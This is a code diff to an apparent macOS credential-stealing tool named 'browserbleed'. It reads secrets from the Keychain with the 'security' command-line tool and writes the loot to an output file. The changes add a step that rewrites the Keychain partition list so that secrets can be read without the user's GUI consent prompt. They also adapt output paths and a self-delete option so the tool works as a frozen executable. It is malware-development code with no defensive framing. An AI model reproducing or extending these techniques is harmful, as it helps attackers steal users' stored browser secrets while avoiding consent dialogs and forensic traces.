@@ -191,10 +191,17 @@ def sqlite_connect(path: str, retries: int = 8, delay: float = 0.25):
 # ── Keychain + crypto ──────────────────────────────────────────────────────────
 def get_keychain_password(service: str, account: str) -> bytes:
     sudo_user = os.environ.get("SUDO_USER")
-    cmd = ["security", "find-generic-password", "-s", service, "-a", account, "-w"]
-    if sudo_user:
-        cmd = ["sudo", "-u", sudo_user] + cmd
-    r = subprocess.run(cmd, capture_output=True, text=True)
+
+    def _run(cmd):
+        if sudo_user:
+            cmd = ["sudo", "-u", sudo_user] + cmd
+        return subprocess.run(cmd, capture_output=True, text=True)
+
+    # Grant apple-tool partition access so security CLI can read without a GUI prompt.
+    _run(["security", "set-generic-password-partition-list",
+          "-S", "apple-tool:,apple:", "-s", service, "-a", account])
+
+    r = _run(["security", "find-generic-password", "-s", service, "-a", account, "-w"])
     if r.returncode != 0:
         raise RuntimeError(f"Keychain lookup failed for '{service}': {r.stderr.strip()}")
     return r.stdout.strip().encode()
@@ -1165,10 +1172,12 @@ def main():
 
     report = "\n".join(lines)
 
+    _exe_dir = os.path.dirname(sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__))
+
     if args.out:
         out_path = args.out
     else:
-        out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "browserbleed_output.txt")
+        out_path = os.path.join(_exe_dir, "browserbleed_output.txt")
 
     with open(out_path, "w", encoding="utf-8") as f:
         f.write(report)
@@ -1176,7 +1185,7 @@ def main():
     print(f"[+] Output written to {out_path}")
 
     if args.self_delete:
-        os.unlink(os.path.abspath(__file__))
+        os.unlink(sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__))
 
 
 if __name__ == "__main__":
@@ -1184,6 +1193,7 @@ if __name__ == "__main__":
         main()
     except Exception as e:
         import traceback
-        err_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "browserbleed_error.txt")
+        _exe_dir = os.path.dirname(sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__))
+        err_path = os.path.join(_exe_dir, "browserbleed_error.txt")
         with open(err_path, "w") as f:
             f.write(traceback.format_exc())
